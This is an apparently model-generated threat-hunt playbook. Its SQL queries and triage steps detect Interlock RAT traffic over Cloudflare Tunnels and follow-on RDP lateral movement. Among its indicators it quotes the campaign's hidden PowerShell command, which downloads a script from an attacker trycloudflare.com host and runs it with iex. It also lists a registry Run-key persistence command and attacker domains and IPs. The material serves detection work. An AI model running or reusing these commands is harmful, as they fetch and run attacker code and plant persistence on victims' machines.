---
analysis: "A simple detection rule might flag 'trycloudflare.com', but this hunt pivots\
  \ between DNS, direct IP connections, and identity (RDP) logons to identify the\
  \ actual intent\u2014movement from a beachhead\u2014avoiding the noise of legitimate\
  \ developer activity."
blind_spots:
- id: limited-net-visibility
  owner: Network Engineering
  question: Which specific process initiated the connection to Cloudflare?
  remediation: Deploy endpoint agents with full socket tracking.
  requires: hb_network_connection with process ownership on all workstations
  risk: Without process ownership, a connection to Cloudflare might be misattributed
    to legitimate software (e.g., a developer tool).
  stage: command-and-control-tunneling
- id: mfa-status-missing
  owner: Identity Provider Admin
  question: Was MFA used for the suspicious RDP sessions?
  remediation: Ensure MFA provider logs are correctly mapped to the OCSF auth schema.
  requires: hb_auth_signin with mfa column populated
  risk: If MFA was not recorded, we cannot confirm if credentials were stolen and
    reused without secondary verification.
  stage: lateral-movement-rdp
coverage:
- stage: command-and-control-tunneling
  status: covered
  steps:
  - dns-tunneling-leads
  - fallback-ip-connections
  - process-context-php
- stage: lateral-movement-rdp
  status: covered
  steps:
  - lateral-rdp-activity
- reason: Belongs to another part of the 'KongTuke FileFix Leads to New Interlock
    RAT Variant' series.
  stage: initial-access-social-engineering
  status: out_of_scope
- reason: Belongs to another part of the 'KongTuke FileFix Leads to New Interlock
    RAT Variant' series.
  stage: execution-php-rat-launch
  status: out_of_scope
- reason: Belongs to another part of the 'KongTuke FileFix Leads to New Interlock
    RAT Variant' series.
  stage: discovery-automated-reconnaissance
  status: out_of_scope
- reason: Belongs to another part of the 'KongTuke FileFix Leads to New Interlock
    RAT Variant' series.
  stage: discovery-active-directory-enumeration
  status: out_of_scope
- reason: Belongs to another part of the 'KongTuke FileFix Leads to New Interlock
    RAT Variant' series.
  stage: persistence-registry-run-key
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: keep-as-periodic-hunt
  justification: Interlock RAT uses Cloudflare Tunnels to bypass traditional IP-based
    perimeter filtering. Verifying the absence of these tunnels and subsequent RDP
    movement is critical to ensuring an environment has not been breached by this
    evolving ransomware group.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An attacker is using Cloudflare Tunnels (trycloudflare.com) to mask command-and-control
  traffic and leveraging RDP for lateral movement from the initial beachhead.
labels:
- hunt
- attack.t1572
- attack.t1105
- attack.t1021.001
name: Interlock RAT Network Tunneling and RDP Movement
parameters:
  c2_domains:
    default:
    - existed-bunch-balance-councils.trycloudflare.com
    - ferrari-rolling-facilities-lounge.trycloudflare.com
    - galleries-physicians-psp-wv.trycloudflare.com
    - evidence-deleted-procedure-bringing.trycloudflare.com
    - nowhere-locked-manor-hs.trycloudflare.com
    - ranked-accordingly-ab-hired.trycloudflare.com
    description: Cloudflare Tunnel domains identified in Interlock RAT campaigns.
    from:
      kind: article
      observed: '2025-07-14'
      ref: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    type: list[domain]
  c2_ips:
    default:
    - 64.95.12.71
    - 184.95.51.165
    description: Hardcoded fallback C2 IPs for the Interlock RAT.
    from:
      kind: article
      observed: '2025-07-14'
      ref: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of network and auth history to examine.
    from:
      kind: manual
      observed: '2024-01-01'
      ref: hunt-standard
    type: number
  scope_hosts:
    default: []
    description: Specific hostnames identified in the scoping phase to focus on in
      later steps.
    from:
      kind: manual
      observed: '2025-07-24'
      ref: hunt-input
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Focus on workstations as the primary leads for C2 activity, then pivot
  to servers (Domain Controllers, File Servers) for RDP targets. Use the scoped hosts
  to focus the network and auth log searches.
references:
- name: "The DFIR Report \u2014 KongTuke FileFix Leads to New Interlock RAT Variant"
  url: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
related:
- hunt: interlock-rat-initial-execution
  reason: This hunt picks up after the PHP RAT has been executed and begins its network
    phase.
  relation: follows
scenario:
  stages:
  - name: Socially engineered clipboard execution
    observables:
    - deadly-programming-attorneys-our.trycloudflare.com
    - powershell.exe -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object
      System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\")
      | iex"
    slug: initial-access-social-engineering
    tactic: initial-access
    techniques:
    - T1204.001
    - T1059.001
  - name: Interlock RAT PHP execution
    observables:
    - AppData\Roaming\php\php.exe
    - AppData\Roaming\php\wefs.cfg
    - php.exe -d extension=zip -d extension_dir=ext
    - wefs.cfg
    slug: execution-php-rat-launch
    tactic: execution
    techniques:
    - T1059.001
  - name: Automated system discovery
    observables:
    - systeminfo /FO CSV
    - tasklist /svc
    - Get-Service
    - Get-PSDrive
    - Get-NetNeighbor -AddressFamily IPv4
    - Security.Principal.WindowsIdentity
    slug: discovery-automated-reconnaissance
    tactic: discovery
    techniques:
    - T1082
    - T1057
    - T1007
    - T1018
    - T1033
  - name: Active Directory and backup enumeration
    observables:
    - '[adsiSearcher]"(ObjectClass=computer)"'
    - net user %USERNAME% /domain
    - 'nltest /dclist:'
    - VEEAM
    - BCK
    - BACK
    - VB
    - VBR
    slug: discovery-active-directory-enumeration
    tactic: discovery
    techniques:
    - T1087.002
    - T1018
    - T1069.002
  - name: Registry persistence via Run key
    observables:
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v /t REG_SZ /d ""C:\Users\REDACTED\AppData\Roaming\php\php.exe"
      "C:\Users\REDACTED\AppData\Roaming\php\wefs.cfg"" /f
    slug: persistence-registry-run-key
    tactic: persistence
    techniques:
    - T1547.001
  - name: C2 via Cloudflare Tunnel
    observables:
    - trycloudflare.com
    - 64.95.12.71
    - 184.95.51.165
    - existed-bunch-balance-councils.trycloudflare.com
    - ferrari-rolling-facilities-lounge.trycloudflare.com
    slug: command-and-control-tunneling
    tactic: command-and-control
    techniques:
    - T1572
    - T1105
  - name: Lateral movement via RDP
    observables:
    - Remote Desktop Protocol usage
    slug: lateral-movement-rdp
    tactic: lateral-movement
    techniques:
    - T1021.001
  summary: The Interlock group uses KongTuke web-injects to deceive users into pasting
    malicious PowerShell commands from their clipboard into the Windows Run box. This
    command downloads and executes a PHP-based remote access trojan (RAT) that performs
    extensive local and Active Directory discovery before establishing persistence
    via registry keys and Command and Control through Cloudflare tunnels.
series:
  index: 2
  slug: kongtuke-filefix-leads-to-new-interlock-rat-variant
  title: KongTuke FileFix Leads to New Interlock RAT Variant
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  identity:
    category: identity
    name: Identity / sign-in telemetry
    telemetry:
    - identity
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# Interlock RAT Network Tunneling and RDP Movement

This hunt focuses on the network-level persistence and movement phase of the Interlock RAT. It first identifies hosts communicating with Cloudflare Tunnels or hardcoded fallback IPs, then pivots to look for anomalous RDP logon patterns originating from those potential beachheads. By correlating legitimate service abuse (Cloudflare) with credential-based movement (RDP), the hunt identifies sessions that bypass standard binary-only detections.

## dns-tunneling-leads
<!-- C2 Tunnels via Cloudflare -->
Identify hosts resolving Cloudflare Tunnel addresses used by the Interlock RAT.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days, c2_domains=c2_domains)
~~~yaml
expected: A host resolving trycloudflare.com domains, particularly those matching
  the report's patterns. Silence indicates no active tunnel queries in the DNS logs.
reads:
- device_hostname
- query_hostname
- process_name
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, query_hostname, process_name, COUNT(*) as query_count, MIN(time) as first_query, MAX(time) as last_query FROM hb_dns_activity WHERE (LOWER(query_hostname) LIKE '%.trycloudflare.com' OR instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, query_hostname, process_name
```

## fallback-ip-connections
<!-- Direct Connections to C2 Fallbacks -->
Identify network connections to hardcoded C2 IPs that bypass DNS resolution.

```sqlite target=network role=detection-candidate params=(lookback_days=lookback_days, c2_ips=c2_ips, scope_hosts=scope_hosts)
~~~yaml
expected: Connections to 64.95.12.71 or 184.95.51.165. Silence indicates these specific
  fallback IPs were not contacted.
reads:
- device_hostname
- dst_endpoint_ip
- dst_endpoint_port
- process_name
- time
- state_kind
silence: evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name, COUNT(*) as connection_count, MIN(time) as first_conn FROM hb_network_connection WHERE (instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND state_kind = 'log' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name
```

## parallel-corroboration
<!-- Corroborate Lateral Movement and Process Context -->
parallel:
- → lateral-rdp-activity
- → process-context-php
join: → triage-agent

## lateral-rdp-activity
<!-- Anomalous RDP Logons from Leads -->
Find RDP logons occurring on the estate that may represent lateral movement from suspicious hosts.

```sqlite target=identity role=baseline params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
baseline:
  compare: new_this_window
  window: '{{lookback_days}}d'
expected: RDP sign-ins originating from or targeting hosts identified in the scoping
  steps. Rare user/source pairs stand out.
prevalence:
  by: dst_endpoint_name
  key:
  - actor_user_name
  - src_endpoint_ip
  rare_below: 3
reads:
- src_endpoint_ip
- dst_endpoint_name
- actor_user_name
- auth_protocol
- status
- time
silence: not_evidence_of_absence
source: hb_auth_signin
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT src_endpoint_ip, dst_endpoint_name, actor_user_name, auth_protocol, status, COUNT(*) as login_count FROM hb_auth_signin WHERE (LOWER(auth_protocol) = 'rdp' OR LOWER(dst_endpoint_name) LIKE '%rdp%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || src_endpoint_ip || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY src_endpoint_ip, dst_endpoint_name, actor_user_name HAVING login_count < 10
```

## process-context-php
<!-- PHP Process Network Ownership -->
Confirm if the C2 network activity is owned by the PHP executable described in the Interlock RAT campaign.

```sqlite target=network role=triage params=(lookback_days=lookback_days)
~~~yaml
expected: php.exe making external connections, which is abnormal for a standard workstation
  profile.
reads:
- device_hostname
- process_name
- process_path
- dst_endpoint_ip
- dst_endpoint_port
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, process_name, process_path, dst_endpoint_ip, dst_endpoint_port, time FROM hb_network_connection WHERE LOWER(process_name) LIKE '%php.exe%' AND (LOWER(dst_endpoint_ip) LIKE '64.95.12.%' OR LOWER(dst_endpoint_ip) LIKE '184.95.51.%' OR dst_endpoint_port IN (80, 443)) AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-agent
<!-- Correlate Network and Lateral Signals -->
```agent target=hunter
cite: required
context:
- dns-tunneling-leads
- fallback-ip-connections
- lateral-rdp-activity
- process-context-php
max_iterations: 6
objective: Determine if any host exhibits both C2 tunneling behavior and subsequent
  anomalous RDP lateral movement logons.
success_criteria: A per-host verdict of 'malicious' for those with both C2 and RDP
  signals, or 'suspicious' for those with C2 only.
tools:
- endpoint
- identity
- network
```

## verdict-decision
<!-- Route Based on Intrusion Confidence -->
if~: "the triage verdict identifies at least one host with confirmed C2 tunneling (DNS/IP) and associated lateral movement (RDP)" (confidence: high, judge=hunter)
then: → isolate-compromised-host
indeterminate: → analyst-manual-triage
unavailable: → analyst-manual-triage (blind_spot: limited-net-visibility)
else: → close-out

## isolate-compromised-host
<!-- Isolate Confirmed Beachhead -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host identified as the beachhead. Revoke any active RDP sessions originating from this host.
```
→ analyst-manual-triage

## analyst-manual-triage
<!-- Detailed Incident Triage -->
```manual target=analyst
Review the DNS and Network connections cited by the agent. Cross-reference the RDP logon times with the C2 activity times. If malicious, escalate to the Incident Response team for credential rotation.
```
→ end

## close-out
<!-- Hunt Closeout -->
```manual target=analyst
Document the absence of trycloudflare.com traffic and RDP anomalies for the reporting period.
```
→ end
